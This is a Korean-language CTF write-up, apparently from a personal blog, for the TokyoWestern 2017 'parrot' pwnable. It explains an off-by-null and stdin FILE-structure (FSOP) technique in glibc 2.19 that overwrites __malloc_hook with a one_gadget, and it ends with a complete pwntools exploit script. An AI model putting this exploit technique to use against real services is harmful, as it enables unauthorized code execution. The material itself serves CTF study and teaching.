---
title: TokyoWestern 2017 - parrot
categories:
 - pwnable
tags: tokyowestern, pwn, fsop, off_by_null
---

## Introduction

정말 우물 안 개구리라는 것을 느끼개 해준 문제이다. 최신동향 조금이나마 따라가고 있다고 생각했었는데 ㅋㅋ.. 어림없지 컷! 2017년 문제부터 풀고와~ ㅋㅋㅋ

개인적으로 너무 답도 없다고 느껴서 WriteUp을 참고했다.

문제는 glibc-2.23으로 나왔지만 지금 환경상 glibc-2.19 밖에 쓰질 못하기 때문에 glibc-2.19로 문제를 풀었다.

## Vunlnerability


```c++
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

```c++
main(0xa20)

	setvbuf(stdin, 0, 2, 0) call 0x8c0

	setvbuf(stdout, 0, 2, 0) call 0x8c0

	sleep(0x3) call 0x8d8

	while True:
		
		puts("Size:") call 0x888
		
		scanf("%lu", rbp-0x18) call 0x8c8
		
		getchar() call 0x8a8
		
		if [rbp-0x18] == 0:
			exit(0) call 0x8d0
		
		[rbp-0x10] = malloc([rbp-0x18]) call 0x8b8
		
		puts("Buffer:")
		
		read(0, [rbp-0x10], [rbp-0x18]) call 0x898
		
		[[rbp-0x18] + [rbp-0x10] - 1] = 0
		
		write(1, [rbp-0x10], [rbp-0x18]) call 0x890
		
		free([rbp-0x10]) call 0x880
```

parrot 바이너리의 `main`에서 `malloc`을 호출하고 에러검사를 하지않는다.

이때 `BYTE PTR [malloc_return_addr + size - 1] = 0`를 해주는데 여기서 `size`를 library 주소만큼 줘서 `malloc`에서 에러나게 해서` malloc_return_addr`는 0으로 세팅할 수 있게 된다.


## Exploit

`exploit`은 

1. Glibc_leak (malloc_consolidate)
2. One_byte_null to _IO_buf_base
3. __underflow -> _IO_new_file_underflow -> _IO_SYSREAD
4. Stdin's member overwrite
5. _IO_read_ptr sync with _IO_read_end via getchar()
6. When _IO_read_ptr == _IO_read_ptr, recall __underflow
7. Overwrite malloc_hook by call _IO_SYSREAD

이 순서대로 진행된다.

exploit 환경은 glibc-2.23이 아닌 glibc-2.19임을 상기해주길 바란다.

### Libc leak

일반적인 방법으로 `small bin`, `large bin`에 해당하는 chunk를 할당하게 되면 free를 하는 순간 top chunk와 병합이 되버리게 된다. 이 때문에 `fast bin`에 해당하는 적절한 크기를 할당받은 후에 `malloc_consolidate`를 호출하게끔 하여 `fast bin`에 해당하는 chunk들을 병합시켜 `unsorted bin`에 넣어지게 되면 library 주소를 leak 할 수 있게 된다.

`malloc_consolidate`가 호출되는 조건은 

`malloc`에서는

- 처음 malloc이 실행되는 경우
- large bin에 해당하는 chunk가 할당되는 경우
- large bin, fast bin에 해당하지 않는 chunk가 할당될 때 small bin에 chunk가 없을 경우

`free`에서는

- 해제되는 chunk의 size가 fast bin에 해당하지 않고 ...(더알아봐야 됨)

정도가 있다. 이것 말고도 조건이 추가적으로 있을 수도 있으니 `malloc_consolidate` 조건을 찾아보려면 `https://tribal1012.tistory.com/141`에서 찾아보는 것을 추천한다.

아무튼 이런 조건 중에서 `free`를 이용해 `malloc_consolidate`를 호출시켜 문제를 풀었다.

malloc(0x10) > malloc(0x70) > malloc(0x80) > malloc(0x10) 이렇게 할당하게 되면 0x80에 해당하는 chunk가 할당되고 해제될때 `malloc_consolidate`를 호출하게 된다. 이때 처음 할당한 0x10에 해당하는 chunk가 `fast bin`에서 `unsorted bin`으로 넘어가게 되면서 library 주소가 fd, bk에 쓰이게 되고 마지막에 할당된 0x10을 호출하게 되면 write에서 leak이 되게 된다.

### Off_by_null to _IO_buf_base

이제 library 주소를 알게 되었으니 FSOP를 진행하면 된다. 여러 풀이과정이 있지만 `_IO_buf_base`의 마지막 1byte를 null byte로 만드는 것으로 최종적으로 malloc_hook을 overwrite하는 방향으로 진행하겠다.
+++ setvbuf 분석 필요 +++
바이너리의 시작부분 쯤에서 `setvbuf`로 stdin의 버퍼링을 없앤다. 그런데 size를 `_IO_buf_base+57`만큼 입력해서 `_IO_buf_base`의 마지막 byte를 null로 만들어버리면 `scanf`와 같은 IO함수에서 버퍼링이 있다고 인식하게 된다.(`setvbuf`의 내용은 아랫부분에서 다루도록 하겠다.)

그렇게 `scanf` -> `__vfscanf_internal` -> `inchar` -> `_IO_getc_unlocked ` -> `__getc_unlocked_body ` 순서대로 부르게 된다.

```c++
#define __getc_unlocked_body(_fp)                                        \
  (__glibc_unlikely ((_fp)->_IO_read_ptr >= (_fp)->_IO_read_end)        \
   ? __uflow (_fp) : *(unsigned char *) (_fp)->_IO_read_ptr++)
```

`_IO_buf_base`가 조작되고 `_IO_read_ptr`과 `_IO_read_end`의 값이 같아진 상태에서 `scanf`를 호출하기 때문에 `__getc_unlocked_body`에서 `__uflow`를 호출하게 된다.


### Invoke __underflow

여기서부터 `https://youngsouk-hack.tistory.com/66`의 글을 많이 참조했다.

```c
const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_file_finish),
  JUMP_INIT(overflow, _IO_file_overflow),
  JUMP_INIT(underflow, _IO_file_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_default_pbackfail),
  JUMP_INIT(xsputn, _IO_file_xsputn),
  JUMP_INIT(xsgetn, _IO_file_xsgetn),
  JUMP_INIT(seekoff, _IO_new_file_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_new_file_setbuf),
  JUMP_INIT(sync, _IO_new_file_sync),
  JUMP_INIT(doallocate, _IO_file_doallocate),
  JUMP_INIT(read, _IO_file_read),
  JUMP_INIT(write, _IO_new_file_write),
  JUMP_INIT(seek, _IO_file_seek),
  JUMP_INIT(close, _IO_file_close),
  JUMP_INIT(stat, _IO_file_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
```

위를 참조해보면 `__uflow`는 `_IO_default_uflow`로 초기화 되어있기 때문에 `_IO_default_uflow`를 호출하게 된다.

```
int
_IO_default_uflow (FILE *fp)
{
  int ch = _IO_UNDERFLOW (fp);
  if (ch == EOF)
    return EOF;
  return *(unsigned char *) fp->_IO_read_ptr++;
}
libc_hidden_def (_IO_default_uflow)
```

`_IO_default_uflow`는 내부적으로 `_IO_UNDERFLOW`를 호출하는데 이는 vtable의 underflow를 호출하게 되면서 `_IO_new_file_underflow`를 호출하게 된다.

```c++
#define _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)
```

```c++
int
_IO_new_file_underflow (_IO_FILE *fp)
{
  .
  .
  .
  
  _IO_switch_to_get_mode (fp);

  fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;
  fp->_IO_read_end = fp->_IO_buf_base;
  fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end
    = fp->_IO_buf_base;

  count = _IO_SYSREAD (fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base); // _IO_SYSREAD를 통해 _IO_buf_base에 읽어들인다.
  .
  .
  .
  if (fp->_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp->_offset, count);
  return *(unsigned char *) fp->_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)
```

여기서 이제 문제가 발생한다. `_IO_switch_to_get_mode`를 호출한 뒤의 동작을 살펴보게 되면 `fp->_IO_read_base`, `fp->_IO_read_ptr`, `fp->_IO_read_end`, `fp->_IO_write_base`, `fp->_IO_write_ptr`,`fp->_IO_write_end` 모두에 `fp->_IO_buf_base`의 값을 넣게 된다.

이후 `_IO_SYSREAD`를 호출하게 되는데 이는

```c++
#define _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

const struct _IO_jump_t _IO_file_jumps libio_vtable =
{
  .
  .
    
  JUMP_INIT(read, _IO_file_read),
  
  .
  .
};

ssize_t
_IO_file_read (FILE *fp, void *buf, ssize_t size)
{
  return (__builtin_expect (fp->_flags2 & _IO_FLAGS2_NOTCANCEL, 0)
          ? __read_nocancel (fp->_fileno, buf, size)
          : __read (fp->_fileno, buf, size));
}
libc_hidden_def (_IO_file_read)
```

최종적으로 `_IO_file_read`를 호출하게 된다. 여기서 최종적으로 buf로 `fp->_IO_buf_base`가 들어가고 size로 `fp->IO_buf_end - fp->_IO_buf_base`를 넣어주게 되는것이다. 여기서 조작된 `fp->_IO_buf_base`가 가리키고 있는 곳은 `stdin`구조체의 조금 앞의 주소를 가리키고 있기 때문에 입력받는 값으로 stdin 구조체의 맴버값을 조작할 수 있게 된다.

### Sync _IO_read_ptr with _IO_read_ptr by getchar()

stdin 구조체를 조작한 뒤에 동작을 살펴보면 `scanf` 함수를 호출할때 에러가 발생해서 [rbp-0x18]에 값이 제대로 안들어가게 되고 `getchar`를 호출하게 되면 `_IO_read_ptr`이 증가하는 것을 볼 수 있다. 

먼저 `scnaf` 함수에서 왜 오류가 발생하는지에 대해 알아보도록 하자.


```c
int
__vfscanf_internal (FILE *s, const char *format, va_list argptr,
                    unsigned int mode_flags)
{
	.
	.
	.
	
	 switch (*f++)
	{
		.
		.
		.
	  if (*f == L_('l'))
		{
		  /* A double `l' is equivalent to an `L'.  */
		  ++f;
		  flags |= LONGDBL | LONG;
		}
	  else
		/* ints are long ints.  */
		flags |= LONG;
	  break;
	.
	.
	.
	switch (fc)
	  {
		.
		.
		.
		
		case L_('u'):        /* Unsigned decimal integer.  */
          base = 10;
          goto number;	    
		.
	    .
	  }
	  
	  
	number:
	  c = inchar ();
	  if (__glibc_unlikely (c == EOF))
		input_error ();
	  /* Check for a sign.  */
	  if (c == L_('-') || c == L_('+'))
		{
		  char_buffer_add (&charbuf, c);
		  if (width > 0)
			--width;
		  c = inchar ();
		}
	
	
	
	  if (char_buffer_size (&charbuf) == 0
		  || (char_buffer_size (&charbuf) == 1
			  && (char_buffer_start (&charbuf)[0] == L_('+')
				  || char_buffer_start (&charbuf)[0] == L_('-'))))
		{
		  /* There was no number.  If we are supposed to read a pointer
			 we must recognize "(nil)" as well.  */
		  if (__builtin_expect (char_buffer_size (&charbuf) == 0
								&& (flags & READ_POINTER)
								&& (width < 0 || width >= 5)
								&& c == '('
								&& TOLOWER (inchar ()) == L_('n')
								&& TOLOWER (inchar ()) == L_('i')
								&& TOLOWER (inchar ()) == L_('l')
								&& inchar () == L_(')'), 1))
			/* We must produce the value of a NULL pointer.  A single
			   '0' digit is enough.  */
			  char_buffer_add (&charbuf, L_('0'));
		  else
			{
			  /* The last read character is not part of the number
				 anymore.  */
			  ungetc (c, s);
			  conv_error ();
			}
	.
	.
	.
}
```

`scanf`의 소스코드가 3000줄이 넘기때문에 모든 것을 분석할 수 없었고 FSOP 과정중에서 scanf가 오류를 발생하는 이유에 대해서만 분석을 진행했다.

최종적으로는 마지막의 `conv_error`를 호출하면서 함수가 끝나게 된다. 해당 바이너리에서 `scanf`에 넣어주는 첫 번째 인자에 '%lu'를 넣어주기 때문에 flags에는 `LONG`(0x1)만 저장이 되어있고 base(진수)는 10으로 설정된 상태이다. 따라서  `flags & READ_POINTER`의 조건을 충족하지 못하여 에러를 일으키게 된다. 위의 검사중에서 `char_buffer_size`와 같은 함수들이 눈에 보였는데 이는 `hitcon 2019 trick or treat`에서 사용되므로 조만간 포스팅을 진행하도록 하겠다.

이렇게 되는 이유는 현재 `fp->_IO_read_ptr`이 가리키는 주소에 null밖에 없기 때문에 그런것으로 예상된다.

위에서 사용하는 `inchar`함수는 

```c
#ifdef COMPILE_WSCANF
# define inchar()        (c == WEOF ? ((errno = inchar_errno), WEOF)              \
                         : ((c = _IO_getwc_unlocked (s)),                      \
                            (void) (c != WEOF                                      \
                                    ? ++read_in                                      \
                                    : (size_t) (inchar_errno = errno)), c))
#else
# define inchar()        (c == EOF ? ((errno = inchar_errno), EOF)              \
                         : ((c = _IO_getc_unlocked (s)),                      \
                            (void) (c != EOF                                      \
                                    ? ++read_in                                      \
                                    : (size_t) (inchar_errno = errno)), c))
```

`_IO_getc_unlocked`를 호출하게 되서 밑의 `getchar`를 분석한 것을 참조하면 알겠지만 `fp->_IO_read_ptr`++을 수행한다.

`fp->_IO_read_ptr`의 값이 변하는가 싶지만 그 뒤에 `ungetc`를 호출하는데

```
# define ungetc(c, s)        ((void) ((int) c == EOF                                      \
                                 || (--read_in,                                      \
                                     _IO_sputbackc (s, (unsigned char) c))))
 
# define ungetc_not_eof(c, s)        ((void) (--read_in,                              \
                                      _IO_sputbackc (s, (unsigned char) c)))

int
_IO_sputbackc (FILE *fp, int c)
{
  int result;
  if (fp->_IO_read_ptr > fp->_IO_read_base
      && (unsigned char)fp->_IO_read_ptr[-1] == (unsigned char)c)
    {
      fp->_IO_read_ptr--;
      result = (unsigned char) c;
    }
  else
    result = _IO_PBACKFAIL (fp, c);
  if (result != EOF)
    fp->_flags &= ~_IO_EOF_SEEN;
  return result;
}
libc_hidden_def (_IO_sputbackc)

```

`ungetc`는 `_IO_sputbackc`를 호출하게 되고 `_IO_sputbackc`는 `fp->_IO_read_ptr`--을 수행하여 읽었던 포인터를 다시 뒤로 되돌려 놓는 역할을 하게된다.

이렇기 때문에 `scanf`에서는 오류만 일어나고 `fp->_IO_read_ptr`의 값에 대한 변화는 일어나지 않게된다. 이후 바이너리에서는 개행을 읽기위해 호출한 `getchar`가 실행이 되는데


```c++
int
getchar (void)
{
  int result;
  if (!_IO_need_lock (stdin))
    return _IO_getc_unlocked (stdin);
  _IO_acquire_lock (stdin);
  result = _IO_getc_unlocked (stdin);	
  _IO_release_lock (stdin);
  return result;
}
```

에서 `_IO_getc_unlocked`를 호출하는데

```c++
#define _IO_getc_unlocked(_fp) __getc_unlocked_body (_fp)

#define __getc_unlocked_body(_fp)                                        \
  (__glibc_unlikely ((_fp)->_IO_read_ptr >= (_fp)->_IO_read_end)        \
   ? __uflow (_fp) : *(unsigned char *) (_fp)->_IO_read_ptr++)
```

이번에는 `__uflow`를 호출하지 않고 `fp->_IO_read_ptr`++을 수행한다.



### Invoke __underflow again & Overwrite __malloc_hook

그렇게 `_IO_read_ptr`과 `_IO_read_end`의 값이 같아지게 되면 위에서처럼 다시 `__underflow`를 호출하게 되고 최종적으로 `_IO_SYSREAD`를 호출하게 되는데 이때 `_IO_file_read`의 buf로 들어가게 되는 값이 `_IO_buf_base`이므로 이번에는 `__malloc_hook`을 overwrite 할 수 있게 되면서 다음 malloc을 호출할때 one_gadget으로 쉘을 얻을 수 있게 된다.

### setvbuf

이쯤되면 처음 `_IO_buf_base`에 null byte가 삽입되었을때, 버퍼링이 있다고 착각하게 된다고 했던것에 대한 의문점을 가지게 될것이다. 이에 대해서는 `setvbuf`에 대해 알아야 되는데 `setvbuf`에서 버퍼링을 없애게 되면  `_IO_read_ptr`과 `_IO_read_end`의 값이 같고 `_IO_buf_end`와 `_IO_buf_base`의 차이가 1이 되게 된다.

이 상태에서 `scanf`를 호출하게 되면 `_IO_read_ptr`과 `_IO_read_end`의 값이 같기 때문에 `inchar`를 호출할때 `__uflow`를 실행하게 된다. 그런데 `__uflow`의 함수 동작을 보게되면 `_IO_UNDERFLOW`를 호출하고 리턴할때 `_IO_read_ptr`++을 수행하게 된다. 이 때문에 다시 `_IO_read_ptr`과 `_IO_read_end`의 값이 같아지게 되고 또 `inchar`를 호출할때 `__uflow`를 실행하게 된다. 버퍼링을 없앤다는 것은 `_IO_buf_base`와 `_IO_buf_end`의 공간을 1byte로 만들어서 IO의 내용을 담아두지 않고 계속해서 함수를 호출해 처리하는 것이다.

따라서 `_IO_buf_base`에 null byte를 덮어씌우게 되면서 `_IO_buf_base`와 `_IO_buf_end`의 값의 차이가 1보다 커지고 이 때문에 자연스럽게 버퍼링을 한다고 인식이 되는 것이다.
(setvbuf 분석, free_malloc consolidate 분석)




## slv.py

```python
from pwn import *

p = process('./tw2017parrot')
e = ELF('./tw2017parrot')
libc = e.libc

## glibc 2.19 ##

one_gadget = [0x46428, 0x4647c, 0xe9415, 0xea36d]

sla = lambda s,r : p.sendlineafter(s, str(r))
sa =  lambda s,r : p.sendafter(s, str(r))
sl = lambda s : p.sendline(s)
s = lambda s : p.send(s)


def heap(size, buffer):
	
	sla('Size:\n', size)
	sla('Buffer:\n', buffer)
	
	return


def leak():
	
	heap(0x10, 'a')
	heap(0x70, 'a')
	heap(0x80, 'a') # malloc_consolidate in init_free
	heap(0x10, 'aaaaaab')

	return p.recvuntil('\x00')


def main():
	
	libc_base = u64(leak().split('\n')[1][:6].ljust(8, '\x00')) - 0x3c27b8
	log.info('libc_base : ' + hex(libc_base))
	
	_IO_buf_base = libc_base + libc.symbols['_IO_2_1_stdin_']
	malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
	one_gadget_addr = libc_base + one_gadget[2]
	
	gdb.attach(p, script)
	
	sla('Size:\n', _IO_buf_base+57)
	
	payload = ''
	payload += p64(0)*6
	payload += p64(_IO_buf_base - 0x22a0)
	payload += p64(0)
	payload += p64(0xfbad208b) # stdin _flags
	payload += p64(_IO_buf_base - 0x3c) # _IO_read_ptr
	payload += p64(_IO_buf_base - 0x3c) # _IO_read_end
	payload += p64(_IO_buf_base - 0x40) # _IO_read_base
	payload += p64(0) * 2 # _IO_write_base, _IO_write_ptr
	payload += p64(1) # _IO_write_end
	payload += p64(malloc_hook_addr-0x8) # _IO_buf_base -0x40
	payload += p64(malloc_hook_addr+0x8) # _IO_buf_end
	
	s(payload)
	
	sleep(0.1)
	
	for i in range(0x80):
		p.recvuntil('Size:\n')
		p.sendline('')
		sleep(0.1)
	
	payload = ''
	payload += p64(0)*8
	payload += p64(one_gadget_addr)
	
	sl(payload)
	
	p.interactive()
	
	return

if __name__ == '__main__':
	main()
```


## 느낀 점




## Reference

```
https://tribal1012.tistory.com/141
https://chp747.tistory.com/251
```


